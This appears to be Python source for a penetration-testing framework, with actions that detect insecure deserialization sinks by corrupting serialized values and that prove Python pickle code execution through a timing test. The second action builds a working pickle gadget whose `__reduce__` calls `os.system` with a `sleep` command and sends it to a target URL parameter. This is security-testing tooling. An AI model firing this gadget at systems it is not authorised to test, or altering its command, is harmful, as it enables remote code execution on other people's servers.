"""Insecure deserialization — prove the sink, then prove execution.

Two claims, kept apart:

  * `web.deserialize.detect` proves the parameter reaches a deserializer. It
    sends the value untouched, then a structurally corrupted copy. Only a
    parser that is actually invoked complains with a *deserialization* error
    (`unserialize(): Error at offset`, `pickle.UnpicklingError`,
    `StreamCorruptedException`). A 500 on its own is not evidence — a broken
    parameter value crashes plenty of apps without deserializing anything.

  * `web.deserialize.pickle_rce` proves code execution for Python pickle
    sinks: a pickle whose `__reduce__` runs `sleep` must cost seconds over its
    control, twice. The payload is built locally and only ever sleeps; nothing
    is written and no data is read back.

Both are HIGH risk: the second is an actual code-execution attempt, and the
first sends malformed serialized data. They run only under an explicit HIGH
ceiling.
"""

import asyncio
import base64
import os
import pickle
import re
import time
from urllib.parse import parse_qsl, urlparse

from actions.registry import action, ActionContext, ActionResult
from actions.web.http_util import (body as _body, dedupe_param,
                                   session_headers, status as _status)
from tools.wrappers import curl

_ERROR_MARKERS = (
    # PHP
    "unserialize()", "error at offset", "__php_incomplete_class",
    "notice: unserialize", "unserialization",
    # Python
    "pickle.unpicklingerror", "unpicklingerror", "_pickle.",
    "cannot unpickle", "invalid load key",
    # Java
    "java.io.streamcorruptedexception", "invalidclassexception",
    "classnotfoundexception", "objectinputstream", "java.io.objectstream",
    # .NET
    "binaryformatter", "system.runtime.serialization",
    "serializationexception",
)

_JAVA_MAGIC = b"\xac\xed\x00"
_PY_MAGICS = (b"\x80\x02", b"\x80\x03", b"\x80\x04", b"\x80\x05")


class _Blind:
    """Pickle gadget for a *timing* proof: reduce executes sleep only."""

    def __init__(self, seconds: float):
        self.seconds = seconds

    def __reduce__(self):
        return (os.system, (f"sleep {self.seconds:g}",))


def _maybe_b64(value: str) -> bytes:
    try:
        raw = base64.b64decode(value, validate=True)
    except Exception:
        return b""
    return raw


def format_of(raw_bytes: bytes, text: str) -> str:
    """Name the serialization format, using bytes first and text second."""
    if raw_bytes.startswith(_JAVA_MAGIC):
        return "java"
    if raw_bytes.startswith(_PY_MAGICS):
        return "python"
    if raw_bytes.startswith(b"\x00\x01\x00\x00\x00"):
        return "dotnet"
    if re.search(r"(?:^|[;{])(?:[Osia]:\d+:|a:\d+:\{)", text):
        return "php"
    if text[:2] in ("rO0", "gAS", "AAE"):
        return "java" if text.startswith("rO0") else "unknown"
    return ""


def _tampers(value: str, fmt: str) -> list:
    """Structurally invalid copies — a non-deserializer does not care."""
    out = [("truncated", value[:-8] or value + "X")]
    if fmt == "php":
        lied, n = re.subn(r"s:(\d+):", lambda m: f"s:{int(m.group(1)) + 7}:",
                          value, count=1)
        if n:
            out.append(("length-lie", lied))
        out.append(("broken-object", value.rstrip("}") + "X"))
    elif fmt == "python":
        out.append(("bad-opcode", value[:-4] + "\x00\x00\x00\x00"))
        out.append(("bad-proto", "\x80\xff" + value[2:]))
    elif fmt == "java":
        out.append(("corrupt-stream", value[:8] + "AAAA" + value[12:]))
    return out


def _signature(text: str) -> str:
    low = str(text or "").lower()
    return next((m for m in _ERROR_MARKERS if m in low), "")


@action(
    id="web.deserialize.detect",
    risk="HIGH",
    detectability="medium",
    requires=["url", "param"],
    produces="VulnCandidate",
    idempotent=True,
    timeout=180,
    description=(
        "Prove a deserialization sink: a structurally corrupted serialized "
        "value must produce a parser-specific deserialization error that the "
        "untouched value does not."
    ),
    category="web",
)
async def deserialize_detect(ctx: ActionContext) -> ActionResult:
    url = str(ctx.params.get("url") or ctx.target or "").strip()
    param = str(ctx.params.get("param") or "").strip()
    value = str(ctx.params.get("value") or "").strip()
    if not url or not param:
        return ActionResult(False, error="url and param are required")
    if not value:
        value = dict(parse_qsl(urlparse(url).query,
                               keep_blank_values=True)).get(param, "")
    if not value:
        return ActionResult(False, error="no serialized value to test")

    # The action injects into the URL, so the default request is the one that
    # carries it; callers override when the endpoint insists on POST.
    method = str(ctx.params.get("method") or "GET").upper()
    headers = session_headers(ctx)
    raw_bytes = _maybe_b64(value)
    fmt = format_of(raw_bytes, value)
    if not fmt:
        return ActionResult(
            False, confidence="TENTATIVE",
            error="value does not look serialized (java/python/php/.net)")

    baseline = await curl(dedupe_param(url, param, value), method=method,
                          headers=headers, output="full",
                          follow_redirects=False)
    baseline_sig = _signature(_body(baseline))
    # The value must be accepted as-is: if the untouched form already errors,
    # the endpoint is not using it as serialized data.
    if baseline_sig:
        return ActionResult(
            False, confidence="TENTATIVE",
            error=f"the untouched value already fails deserialization: {baseline_sig}")

    for label, tampered in _tampers(value, fmt):
        raw = await curl(dedupe_param(url, param, tampered), method=method,
                         headers=headers, output="full",
                         follow_redirects=False)
        sig = _signature(_body(raw))
        if not sig:
            continue
        again = await curl(dedupe_param(url, param, tampered), method=method,
                           headers=headers, output="full",
                           follow_redirects=False)
        if _signature(_body(again)) != sig:
            continue
        return ActionResult(
            True, confidence="CONFIRMED",
            data={"url": url, "param": param, "format": fmt,
                  "tamper": label, "error": sig,
                  "status": _status(raw)},
            evidence={"action": "web.deserialize.detect", "format": fmt,
                      "tamper": label, "deserializer_error": sig},
        )

    return ActionResult(
        False, confidence="TENTATIVE",
        error="corrupting the value produced no deserialization-specific error")


@action(
    id="web.deserialize.pickle_rce",
    risk="HIGH",
    detectability="high",
    requires=["url", "param"],
    produces="VulnCandidate",
    idempotent=True,
    timeout=180,
    description=(
        "Prove pickle code execution with a timing proof: a pickle whose "
        "reduce runs `sleep` must cost seconds over its control, twice. "
        "Nothing is read or written on the target."
    ),
    category="web",
)
async def pickle_rce(ctx: ActionContext) -> ActionResult:
    url = str(ctx.params.get("url") or ctx.target or "").strip()
    param = str(ctx.params.get("param") or "").strip()
    value = str(ctx.params.get("value") or "").strip()
    if not url or not param:
        return ActionResult(False, error="url and param are required")
    if not value:
        value = dict(parse_qsl(urlparse(url).query,
                               keep_blank_values=True)).get(param, "")

    raw = _maybe_b64(value)
    if not raw.startswith(_PY_MAGICS):
        if value and not raw:
            return ActionResult(
                False, confidence="TENTATIVE",
                error="value is not a pickle (raw or base64)")
        return ActionResult(False, confidence="TENTATIVE",
                            error="value is not a Python pickle")
    encoded = bool(_maybe_b64(value))

    def payload(seconds: float) -> str:
        blob = pickle.dumps(_Blind(seconds), protocol=4)
        return base64.b64encode(blob).decode() if encoded else blob.decode(
            "latin-1")

    # The action injects into the URL, so the default request is the one that
    # carries it; callers override when the endpoint insists on POST.
    method = str(ctx.params.get("method") or "GET").upper()
    headers = session_headers(ctx)

    seconds = float(ctx.params.get("sleep_seconds") or 6)
    threshold = max(0.02, seconds * 0.6)

    async def timed(candidate: str) -> float:
        start = time.monotonic()
        await curl(dedupe_param(url, param, candidate), method=method,
                   headers=headers, output="full", follow_redirects=False,
                   timeout=int(seconds) + 15)
        return time.monotonic() - start

    # A zero-second pickle keeps the serialization path identical to the
    # sleeping one, so the delta is the sleep and not a parse failure.
    control = await timed(payload(0))
    slow_one = await timed(payload(seconds))
    slow_two = await timed(payload(seconds))
    if min(slow_one, slow_two) - control < threshold:
        return ActionResult(
            False, confidence="TENTATIVE",
            data={"control_seconds": round(control, 2),
                  "probe_seconds": [round(slow_one, 2), round(slow_two, 2)]},
            error="pickle timing did not reproduce the sleep delay")

    return ActionResult(
        True, confidence="CONFIRMED",
        data={"url": url, "param": param, "format": "python-pickle",
              "control_seconds": round(control, 2),
              "probe_seconds": [round(slow_one, 2), round(slow_two, 2)]},
        evidence={"action": "web.deserialize.pickle_rce",
                  "proof": (f"pickle reduce executed sleep "
                            f"({round(min(slow_one, slow_two) - control, 2)}s "
                            f"over control)")},
    )
